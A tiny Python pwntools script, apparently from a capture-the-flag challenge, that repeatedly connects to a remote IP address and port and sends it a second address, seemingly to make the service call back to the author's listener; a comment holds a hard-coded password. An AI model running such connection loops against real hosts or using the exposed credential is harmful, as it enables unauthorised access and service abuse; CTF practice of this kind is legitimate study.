from pwn import *
while 1:
    p = remote('47.100.0.15' , 10003)
    p.sendline('39.97.175.243:10000')
    p.close()
    sleep(2)

#passwd = b'547dd1ccc38'